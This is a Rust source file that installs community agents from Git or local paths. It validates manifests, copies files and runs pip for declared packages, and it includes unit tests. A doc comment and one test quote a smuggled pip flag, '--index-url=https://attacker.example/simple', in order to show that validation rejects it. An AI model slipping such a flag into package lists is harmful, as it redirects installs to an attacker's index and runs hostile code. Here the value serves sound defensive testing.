//! Git-based community agent installation and local registry management.
//!
//! Implements the full install workflow for community agents:
//! clone a Git repository (or accept a local path), read and validate
//! `manifest.json`, copy files to the local data store, run `pip install`
//! for declared packages, and persist the entry in `registry.json`.

use std::path::{Path, PathBuf};

use apollia_core::AgentManifest;
use chrono::{DateTime, Utc};
use serde::{Deserialize, Serialize};

// ─────────────────────────────────────────────────────────────────────────────
// Public types
// ─────────────────────────────────────────────────────────────────────────────

/// Installation source for a community agent.
#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(rename_all = "snake_case", tag = "type")]
pub enum AgentInstallSource {
    /// A local filesystem path (file or directory).
    Local {
        /// The local filesystem path.
        path: PathBuf,
    },
    /// A remote Git repository with an optional tag or branch.
    Git {
        /// The Git remote URL.
        url: String,
        /// Optional branch or tag to check out.
        tag: Option<String>,
    },
}

/// Record persisted in `registry.json` after a successful community agent install.
#[derive(Debug, Serialize, Deserialize)]
pub struct RegistryEntry {
    /// Declared name of the agent.
    pub name: String,
    /// Declared version of the agent.
    pub version: String,
    /// Where this agent was sourced from.
    pub source: AgentInstallSource,
    /// UTC timestamp of the installation.
    pub installed_at: DateTime<Utc>,
}

/// Errors raised during remote or local community agent installation.
#[derive(Debug, thiserror::Error)]
pub enum RemoteInstallError {
    /// `git` executable was not found in the system PATH.
    #[error("git is required but not found in PATH")]
    GitNotFound,
    /// The `git clone` command exited with a non-zero status.
    #[error("git clone failed: {0}")]
    CloneFailed(String),
    /// The provided Git URL failed basic structural validation.
    #[error("invalid git URL: {0}")]
    InvalidUrl(String),
    /// `manifest.json` is absent, unparseable, or missing required fields.
    #[error("manifest validation failed: {0}")]
    ManifestInvalid(String),
    /// `pip install` for a declared package failed.
    #[error("pip install failed: {0}")]
    PipInstallFailed(String),
    /// An underlying I/O error occurred.
    #[error("IO error: {0}")]
    Io(#[from] std::io::Error),
    /// JSON serialization or deserialization failed.
    #[error("JSON error: {0}")]
    Json(#[from] serde_json::Error),
}

// ─────────────────────────────────────────────────────────────────────────────
// Source parsing
// ─────────────────────────────────────────────────────────────────────────────

/// Parse a CLI install argument into an [`AgentInstallSource`].
///
/// Strings that begin with `http://`, `https://`, or `git@` are treated as
/// Git remote URLs. An optional `#<tag>` fragment is extracted and stored as
/// the checkout tag. Everything else is treated as a local filesystem path.
pub fn parse_install_source(s: &str) -> AgentInstallSource {
    if s.starts_with("http://") || s.starts_with("https://") || s.starts_with("git@") {
        let (url, tag) = match s.split_once('#') {
            Some((base, fragment)) if !fragment.is_empty() => {
                (base.to_string(), Some(fragment.to_string()))
            }
            _ => (s.to_string(), None),
        };
        AgentInstallSource::Git { url, tag }
    } else {
        AgentInstallSource::Local {
            path: PathBuf::from(s),
        }
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Git helpers
// ─────────────────────────────────────────────────────────────────────────────

/// Verify that `git` is reachable from the system PATH.
pub fn check_git_available() -> Result<(), RemoteInstallError> {
    match std::process::Command::new("git").arg("--version").output() {
        Ok(o) if o.status.success() => Ok(()),
        Ok(_) => Err(RemoteInstallError::GitNotFound),
        Err(_) => Err(RemoteInstallError::GitNotFound),
    }
}

/// Shallow-clone a Git repository into `target` (depth 1).
///
/// When `tag` is provided, `--branch <tag>` is appended so the clone checks
/// out the specified tag or branch instead of the default.
pub async fn git_clone(
    url: &str,
    tag: Option<&str>,
    target: &Path,
) -> Result<(), RemoteInstallError> {
    if !url.contains("://") && !url.starts_with("git@") {
        return Err(RemoteInstallError::InvalidUrl(url.to_string()));
    }

    let mut cmd = tokio::process::Command::new("git");
    cmd.arg("clone").arg("--depth").arg("1");

    if let Some(t) = tag {
        cmd.arg("--branch").arg(t);
    }

    cmd.arg(url).arg(target);

    let output = cmd
        .output()
        .await
        .map_err(|_| RemoteInstallError::GitNotFound)?;

    if !output.status.success() {
        let stderr = String::from_utf8_lossy(&output.stderr);
        return Err(RemoteInstallError::CloneFailed(stderr.trim().to_string()));
    }

    Ok(())
}

// ─────────────────────────────────────────────────────────────────────────────
// Manifest discovery
// ─────────────────────────────────────────────────────────────────────────────

/// Find the first non-`__init__.py` Python file in `dir` (non-recursive).
///
/// Returns `None` when no `.py` file is present.
pub fn find_agent_file(dir: &Path) -> Option<PathBuf> {
    let entries = std::fs::read_dir(dir).ok()?;
    for entry in entries.flatten() {
        let path = entry.path();
        if path.extension().and_then(|e| e.to_str()) == Some("py") {
            let name = path.file_name().and_then(|n| n.to_str()).unwrap_or("");
            if name != "__init__.py" {
                return Some(path);
            }
        }
    }
    None
}

/// Read and validate `manifest.json` from `dir`.
///
/// Returns [`RemoteInstallError::ManifestInvalid`] when the file is absent,
/// cannot be read, fails to parse, or is missing required fields (`name`,
/// `version`).
pub fn read_manifest_file(dir: &Path) -> Result<AgentManifest, RemoteInstallError> {
    let path = dir.join("manifest.json");
    if !path.exists() {
        return Err(RemoteInstallError::ManifestInvalid(
            "manifest.json not found in agent directory".to_string(),
        ));
    }

    let content = std::fs::read_to_string(&path)?;
    let manifest: AgentManifest = serde_json::from_str(&content).map_err(|e| {
        RemoteInstallError::ManifestInvalid(format!("manifest.json parse error: {e}"))
    })?;

    if manifest.name.is_empty() {
        return Err(RemoteInstallError::ManifestInvalid(
            "manifest.name is required and must not be empty".to_string(),
        ));
    }
    if manifest.version.is_empty() {
        return Err(RemoteInstallError::ManifestInvalid(
            "manifest.version is required and must not be empty".to_string(),
        ));
    }

    Ok(manifest)
}

// ─────────────────────────────────────────────────────────────────────────────
// Installation
// ─────────────────────────────────────────────────────────────────────────────

/// Copy a community agent from `source_dir` into the local data store and
/// update `registry.json`.
///
/// Files are copied to `<install_base>/agents/community/<name>/`.
/// Hidden directories (`.git`, `__pycache__`, etc.) and compiled `.pyc`
/// files are excluded.  Symlinks are skipped to prevent path-traversal attacks.
/// Declared `manifest.packages` are installed with `pip install`.
pub fn install_from_dir(
    source_dir: &Path,
    manifest: &AgentManifest,
    source: AgentInstallSource,
    install_base: &Path,
) -> Result<RegistryEntry, RemoteInstallError> {
    let install_dir = install_base
        .join("agents")
        .join("community")
        .join(&manifest.name);

    std::fs::create_dir_all(&install_dir)?;

    copy_dir_contents(source_dir, &install_dir)?;

    if !manifest.packages.is_empty() {
        install_pip_packages(&manifest.packages)?;
    }

    let entry = RegistryEntry {
        name: manifest.name.clone(),
        version: manifest.version.clone(),
        source,
        installed_at: Utc::now(),
    };

    let registry_path = install_base
        .join("agents")
        .join("community")
        .join("registry.json");
    update_registry(&registry_path, &entry)?;

    Ok(entry)
}

/// Append or replace a [`RegistryEntry`] in the community `registry.json`.
///
/// Creates the file when it does not exist.  Any existing entry with the
/// same agent `name` is removed before the new entry is appended, so that
/// re-installs update rather than duplicate.
pub fn update_registry(
    registry_path: &Path,
    entry: &RegistryEntry,
) -> Result<(), RemoteInstallError> {
    let mut entries: Vec<RegistryEntry> = if registry_path.exists() {
        let content = std::fs::read_to_string(registry_path)?;
        serde_json::from_str(&content)?
    } else {
        Vec::new()
    };

    entries.retain(|e| e.name != entry.name);
    entries.push(RegistryEntry {
        name: entry.name.clone(),
        version: entry.version.clone(),
        source: entry.source.clone(),
        installed_at: entry.installed_at,
    });

    let json = serde_json::to_string_pretty(&entries)?;
    if let Some(parent) = registry_path.parent() {
        std::fs::create_dir_all(parent)?;
    }
    std::fs::write(registry_path, json.as_bytes())?;

    Ok(())
}

// ─────────────────────────────────────────────────────────────────────────────
// Full install workflow
// ─────────────────────────────────────────────────────────────────────────────

/// Install a community agent from a Git URL or a local path.
///
/// Performs the complete install sequence:
/// 1. For Git sources: checks `git` availability, clones the repository
///    (depth 1, optional tag) into a temporary directory, reads
///    `manifest.json`, validates required fields.
/// 2. For local sources: resolves the directory from the given path, reads
///    `manifest.json`, validates required fields.
/// 3. Copies files to `<install_base>/agents/community/<name>/`.
/// 4. Runs `pip install` for packages declared in the manifest.
/// 5. Updates `<install_base>/agents/community/registry.json`.
/// 6. Cleans up the temporary clone directory.
///
/// Manifest validation here is JSON-based (`manifest.json`). Callers that
/// also require AIP duck-typing validation should run
/// `validate_community_agent` from `apollia-cli::community` before or after
/// invoking this function, using the individual helpers (`git_clone`,
/// `find_agent_file`, `install_from_dir`).
pub async fn install_agent(
    source: AgentInstallSource,
    install_base: &Path,
) -> Result<RegistryEntry, RemoteInstallError> {
    match &source {
        AgentInstallSource::Git { url, tag } => {
            check_git_available()?;

            let temp = TempInstallDir::new()?;
            let result = git_install(
                url,
                tag.as_deref(),
                temp.path(),
                source.clone(),
                install_base,
            )
            .await;
            // temp is dropped (and cleaned up) regardless of outcome.
            result
        }
        AgentInstallSource::Local { path } => {
            let dir = agent_dir_from_path(path);
            let manifest = read_manifest_file(&dir)?;
            install_from_dir(&dir, &manifest, source.clone(), install_base)
        }
    }
}

/// Inner Git install: clone, read manifest, install.
async fn git_install(
    url: &str,
    tag: Option<&str>,
    temp_path: &Path,
    source: AgentInstallSource,
    install_base: &Path,
) -> Result<RegistryEntry, RemoteInstallError> {
    git_clone(url, tag, temp_path).await?;
    let manifest = read_manifest_file(temp_path)?;
    install_from_dir(temp_path, &manifest, source, install_base)
}

/// Resolve the agent directory from a path that may be a file or a directory.
fn agent_dir_from_path(path: &Path) -> PathBuf {
    if path.is_dir() {
        path.to_path_buf()
    } else {
        path.parent()
            .map(|p| p.to_path_buf())
            .unwrap_or_else(|| PathBuf::from("."))
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Private helpers
// ─────────────────────────────────────────────────────────────────────────────

/// RAII guard that removes a temporary directory on drop.
pub struct TempInstallDir {
    path: PathBuf,
}

impl TempInstallDir {
    /// Create a new uniquely-named temporary directory under the system temp dir.
    pub fn new() -> std::io::Result<Self> {
        let suffix: u64 = rand::random();
        let path = std::env::temp_dir().join(format!("apollia-install-{suffix:016x}"));
        std::fs::create_dir_all(&path)?;
        Ok(Self { path })
    }

    /// Return the path to the temporary directory.
    pub fn path(&self) -> &Path {
        &self.path
    }
}

impl Drop for TempInstallDir {
    fn drop(&mut self) {
        let _ = std::fs::remove_dir_all(&self.path);
    }
}

/// Recursively copy files from `src` to `dst`, skipping hidden directories,
/// `__pycache__`, `.pyc` files, and symlinks.
fn copy_dir_contents(src: &Path, dst: &Path) -> Result<(), RemoteInstallError> {
    for entry in std::fs::read_dir(src)? {
        let entry = entry?;
        let name = entry.file_name();
        let name_str = name.to_string_lossy();

        // Skip hidden entries, Python bytecode cache.
        if name_str.starts_with('.') || name_str == "__pycache__" {
            continue;
        }

        let file_type = entry.file_type()?;
        let dest = dst.join(&name);

        if file_type.is_dir() {
            std::fs::create_dir_all(&dest)?;
            copy_dir_contents(&entry.path(), &dest)?;
        } else if file_type.is_file() {
            if name_str.ends_with(".pyc") {
                continue;
            }
            std::fs::copy(entry.path(), &dest)?;
        }
        // Symlinks are intentionally skipped.
    }
    Ok(())
}

/// Run `pip install <pkg>` for each declared package.
///
/// Every entry is validated first. These packages come from a **remote**
/// registry manifest, so they are less trustworthy than a local one, and each
/// becomes an argv element for `pip`, which reads a leading `-` as a flag. An
/// entry like `--index-url=https://attacker.example/simple` would otherwise
/// redirect the index and execute attacker-controlled `setup.py` code. The
/// validation is shared with `PythonExecutor::setup_venv` so both install paths
/// enforce the same rule.
fn install_pip_packages(packages: &[String]) -> Result<(), RemoteInstallError> {
    for pkg in packages {
        apollia_tools::tools::python_executor::validate_package_spec(pkg)
            .map_err(|e| RemoteInstallError::PipInstallFailed(e.to_string()))?;
    }
    for pkg in packages {
        let output = std::process::Command::new("pip")
            .args(["install", pkg.as_str()])
            .output()
            .map_err(|e| RemoteInstallError::PipInstallFailed(format!("pip not found: {e}")))?;

        if !output.status.success() {
            let stderr = String::from_utf8_lossy(&output.stderr);
            return Err(RemoteInstallError::PipInstallFailed(format!(
                "failed to install '{pkg}': {}",
                stderr.trim()
            )));
        }
    }
    Ok(())
}

// ─────────────────────────────────────────────────────────────────────────────
// Tests
// ─────────────────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;
    use std::io::Write as _;

    fn write_manifest(dir: &Path, name: &str, version: &str) -> std::io::Result<()> {
        let manifest = serde_json::json!({
            "name": name,
            "version": version,
            "description": "test agent",
            "tools_required": []
        });
        let mut f = std::fs::File::create(dir.join("manifest.json"))?;
        f.write_all(manifest.to_string().as_bytes())?;
        Ok(())
    }

    // ── URL parsing ──────────────────────────────────────────────────────────

    #[test]
    fn test_parse_git_url_with_tag() {
        // GIVEN a Git URL with a #tag fragment
        let s = "https://github.com/user/agent.git#v1.0";

        // WHEN parsed
        let source = parse_install_source(s);

        // THEN AgentInstallSource::Git with url and tag
        match source {
            AgentInstallSource::Git { url, tag } => {
                assert_eq!(url, "https://github.com/user/agent.git");
                assert_eq!(tag, Some("v1.0".to_string()));
            }
            _ => panic!("expected Git source"),
        }
    }

    #[test]
    fn test_parse_git_url_without_tag() {
        // GIVEN a Git URL without fragment
        let s = "https://github.com/user/agent.git";

        // WHEN parsed
        let source = parse_install_source(s);

        // THEN AgentInstallSource::Git with tag = None
        match source {
            AgentInstallSource::Git { url, tag } => {
                assert_eq!(url, s);
                assert_eq!(tag, None);
            }
            _ => panic!("expected Git source"),
        }
    }

    #[test]
    fn test_parse_local_path() {
        // GIVEN a local filesystem path
        let s = "./agents/my-agent.py";

        // WHEN parsed
        let source = parse_install_source(s);

        // THEN AgentInstallSource::Local
        match source {
            AgentInstallSource::Local { path } => {
                assert_eq!(path, PathBuf::from(s));
            }
            _ => panic!("expected Local source"),
        }
    }

    #[test]
    fn test_parse_git_ssh_url() {
        // GIVEN a Git SSH URL
        let s = "git@github.com:user/agent.git";

        // WHEN parsed
        let source = parse_install_source(s);

        // THEN AgentInstallSource::Git
        assert!(matches!(source, AgentInstallSource::Git { .. }));
    }

    // ── Error messages ────────────────────────────────────────────────────────

    #[test]
    fn test_git_not_found_error_message() {
        // GIVEN the GitNotFound error variant
        let err = RemoteInstallError::GitNotFound;

        // WHEN formatted
        // THEN the message matches the expected string
        assert_eq!(err.to_string(), "git is required but not found in PATH");
    }

    // ── Local install (non-regression) ────────────────────────────────────────

    #[tokio::test]
    async fn test_install_local_non_regression() {
        // GIVEN a valid local agent directory with manifest.json and agent.py
        let tmp = tempfile::TempDir::new().expect("tempdir");
        std::fs::write(tmp.path().join("agent.py"), "# test agent\n").expect("write agent.py");
        write_manifest(tmp.path(), "test-local-agent", "1.0.0").expect("write manifest");

        let install_base = tempfile::TempDir::new().expect("install base");
        let source = AgentInstallSource::Local {
            path: tmp.path().join("agent.py"),
        };

        // WHEN install_agent(Local(path)) is called
        let result = install_agent(source, install_base.path()).await;

        // THEN Ok(entry) with source Local and correct metadata
        let entry = result.expect("install must succeed");
        assert_eq!(entry.name, "test-local-agent");
        assert_eq!(entry.version, "1.0.0");
        assert!(matches!(
            entry.source,
            AgentInstallSource::Local { path: _ }
        ));
    }

    // ── Invalid manifest ──────────────────────────────────────────────────────

    #[tokio::test]
    async fn test_invalid_manifest_no_install() {
        // GIVEN a directory whose manifest.json is missing the required name field
        let tmp = tempfile::TempDir::new().expect("tempdir");
        std::fs::write(
            tmp.path().join("manifest.json"),
            r#"{"no_name_field": true}"#,
        )
        .expect("write manifest");

        let install_base = tempfile::TempDir::new().expect("install base");
        let source = AgentInstallSource::Local {
            path: tmp.path().to_path_buf(),
        };

        // WHEN install_agent is called
        let result = install_agent(source, install_base.path()).await;

        // THEN Err(ManifestInvalid)
        assert!(
            matches!(result, Err(RemoteInstallError::ManifestInvalid(_))),
            "expected ManifestInvalid, got: {result:?}"
        );

        // AND no files were written to community/
        let community_dir = install_base.path().join("agents").join("community");
        let no_agent_installed = !community_dir.exists()
            || std::fs::read_dir(&community_dir)
                .map(|mut d| d.next().is_none())
                .unwrap_or(true);
        assert!(
            no_agent_installed,
            "community dir must be empty on failed install"
        );
    }

    #[tokio::test]
    async fn test_missing_manifest_json_returns_error() {
        // GIVEN a directory with no manifest.json
        let tmp = tempfile::TempDir::new().expect("tempdir");
        std::fs::write(tmp.path().join("agent.py"), "# agent\n").expect("write");

        let install_base = tempfile::TempDir::new().expect("install base");
        let source = AgentInstallSource::Local {
            path: tmp.path().to_path_buf(),
        };

        // WHEN install_agent is called
        let result = install_agent(source, install_base.path()).await;

        // THEN Err(ManifestInvalid)
        assert!(
            matches!(result, Err(RemoteInstallError::ManifestInvalid(_))),
            "expected ManifestInvalid, got: {result:?}"
        );
    }

    // ── Registry update ───────────────────────────────────────────────────────

    #[tokio::test]
    async fn test_registry_json_updated_after_install() {
        // GIVEN a valid agent directory and an empty install base
        let tmp = tempfile::TempDir::new().expect("tempdir");
        let py = tmp.path().join("agent.py");
        std::fs::write(&py, "# agent\n").expect("write");
        write_manifest(tmp.path(), "registry-test-agent", "2.0.0").expect("manifest");

        let install_base = tempfile::TempDir::new().expect("install base");
        let source = AgentInstallSource::Local { path: py };

        // WHEN install_agent succeeds
        install_agent(source, install_base.path())
            .await
            .expect("install must succeed");

        // THEN registry.json contains the entry with correct name, version, and date
        let registry_path = install_base
            .path()
            .join("agents")
            .join("community")
            .join("registry.json");
        assert!(registry_path.exists(), "registry.json must be created");

        let content = std::fs::read_to_string(&registry_path).expect("read registry");
        let entries: Vec<RegistryEntry> =
            serde_json::from_str(&content).expect("parse registry.json");

        let found = entries
            .iter()
            .find(|e| e.name == "registry-test-agent")
            .expect("agent must be in registry");
        assert_eq!(found.version, "2.0.0");
    }

    #[test]
    fn test_update_registry_replaces_existing_entry() {
        // GIVEN a registry.json that already contains an entry for "my-agent"
        let tmp = tempfile::TempDir::new().expect("tempdir");
        let registry_path = tmp.path().join("registry.json");

        let old_entry = RegistryEntry {
            name: "my-agent".to_string(),
            version: "0.1.0".to_string(),
            source: AgentInstallSource::Local {
                path: PathBuf::from("/old"),
            },
            installed_at: Utc::now(),
        };
        update_registry(&registry_path, &old_entry).expect("first write");

        // WHEN the same agent is re-installed with a newer version
        let new_entry = RegistryEntry {
            name: "my-agent".to_string(),
            version: "0.2.0".to_string(),
            source: AgentInstallSource::Local {
                path: PathBuf::from("/new"),
            },
            installed_at: Utc::now(),
        };
        update_registry(&registry_path, &new_entry).expect("second write");

        // THEN registry.json contains exactly one entry with the new version
        let content = std::fs::read_to_string(&registry_path).expect("read");
        let entries: Vec<RegistryEntry> = serde_json::from_str(&content).expect("parse");
        assert_eq!(entries.len(), 1, "re-install must not duplicate the entry");
        assert_eq!(entries[0].version, "0.2.0");
    }

    // GIVEN a remote registry manifest declaring a flag-shaped package
    // WHEN the pip install step runs
    // THEN it refuses before invoking pip. A remote manifest is the least
    //      trustworthy source of these strings, and pip would read a leading '-'
    //      as an option, redirecting the index to an attacker's server.
    #[test]
    fn test_remote_packages_cannot_smuggle_a_pip_flag() {
        let hostile = vec![
            "requests".to_string(),
            "--index-url=https://attacker.example/simple".to_string(),
        ];
        match install_pip_packages(&hostile) {
            Err(RemoteInstallError::PipInstallFailed(msg)) => {
                assert!(msg.contains("flag"), "reason should name the flag: {msg}");
            }
            other => panic!("expected PipInstallFailed, got {other:?}"),
        }
    }

    // GIVEN an empty package list
    // WHEN the pip install step runs
    // THEN it succeeds without invoking pip at all
    #[test]
    fn test_no_packages_is_a_no_op() {
        assert!(install_pip_packages(&[]).is_ok());
    }
}
